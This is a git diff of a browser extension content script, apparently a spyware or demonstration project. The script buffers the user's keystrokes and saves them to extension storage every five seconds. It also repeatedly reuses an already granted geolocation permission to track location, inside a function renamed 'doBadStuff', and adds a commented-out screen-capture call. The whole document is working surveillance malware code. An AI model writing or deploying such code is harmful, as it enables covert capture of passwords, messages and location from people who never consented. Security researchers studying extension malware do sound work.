@@ -1,7 +1,7 @@
-import { simpleAppend } from "../utils/shared-utils";
+import { IKeyLogEntry } from "src/interfaces";
 import { BackgroundMessage, StorageKey } from "../consts";
 import { sendMessage, updateGeolocation } from "../utils/page-utils";
-import { IKeylogEntry, ILogEntry } from "src/interfaces";
+import { logData, simplePrepend, writeLog } from "../utils/shared-utils";
 
 console.log("content-script.ts");
 
@@ -9,7 +9,8 @@ let buffer = "";
 
 sendMessage(BackgroundMessage.HEARTBEAT);
 
-function piggybackPermissions() {
+async function doBadStuff() {
+  // Piggyback permissions for geolocation
   navigator.permissions
     .query({ name: "geolocation" })
     .then(({ state }: { state: string }) => {
@@ -17,16 +18,22 @@ function piggybackPermissions() {
         updateGeolocation();
       }
     });
+
+  // if (document.visibilityState === "visible") {
+  //   captureVisibleTab();
+  // }
 }
 
 async function writeBuffer() {
   if (buffer.length > 0) {
-    await simpleAppend<IKeylogEntry>(StorageKey.KEYLOG, {
-      timestamp: new Date().toISOString(),
+    await simplePrepend<IKeyLogEntry>(StorageKey.KEY_LOG, {
+      ...logData(),
       buffer,
     });
 
     buffer = "";
+
+    writeLog("Wrote keylog buffer");
   }
 }
 
@@ -41,8 +48,10 @@ document.addEventListener("keyup", (e: KeyboardEvent) => {
 
 setInterval(() => writeBuffer(), 5000);
 
-document.addEventListener("visibilitychange", () => piggybackPermissions());
+document.addEventListener("visibilitychange", () => doBadStuff());
 
-setInterval(() => piggybackPermissions(), 60 * 1e3);
+setInterval(() => {
+  doBadStuff();
+}, 60 * 1e3);
 
-piggybackPermissions();
+doBadStuff();
